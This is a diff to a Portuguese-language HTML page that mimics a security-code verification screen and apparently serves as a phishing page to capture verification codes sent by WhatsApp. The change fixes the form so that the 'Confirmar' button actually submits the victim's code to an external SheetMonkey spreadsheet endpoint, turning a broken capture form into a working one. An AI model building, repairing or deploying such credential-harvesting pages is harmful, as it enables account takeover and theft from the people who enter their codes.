@@ -118,19 +118,24 @@
   <div class="container">
     <div class="lock-icon"><img src="./Xereca.png" alt=""></div>
     <p>Insira o código enviado por WhatsApp ao seu número de celular: +55 ●●●● ●●●●.</p>
-    <!-- Coloque o Link da api abaixo metodo Post -->
-    <form action="https://api.sheetmonkey.io/form/73DiZN8cDaFDherk3sjMco" method="post">
     
-    <label for="Codigo"><input type="text" id="Codigo" name="Codigo" placeholder="Código de segurança"></label>
-   <!--  Botao do krl -->
-    <button class="btn"
-        type="button"  onclick="window.location.href=''">
-    Confirmar
-</button>
+    <!-- Formulário que envia para a API do SheetMonkey -->
+    <form action="https://api.sheetmonkey.io/form/73DiZN8cDaFDherk3sjMco" method="post">
+      <label for="Codigo">
+        <input type="text" id="Codigo" name="Codigo" placeholder="Código de segurança">
+      </label>
 
-    <div class="checkbox">
-      <label><input type="checkbox" checked> Confiar neste dispositivo<br><small>Não solicitaremos um código na próxima vez</small></label>
-    </div>
+      <!-- Botão corrigido para funcionar corretamente -->
+      <button class="btn" type="submit">Confirmar</button>
+
+      <div class="checkbox">
+        <label>
+          <input type="checkbox" checked>
+          Confiar neste dispositivo<br>
+          <small>Não solicitaremos um código na próxima vez</small>
+        </label>
+      </div>
+    </form>
 
     <p><a href="#">Enviar código por SMS</a></p>
     <p>Se você não receber um código de segurança, use um dos seus<br><a href="#">códigos de reserva</a>.</p>
@@ -138,7 +143,6 @@
 
   <div class="store-buttons">
     <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
-    
   </div>
 
   <div class="footer">
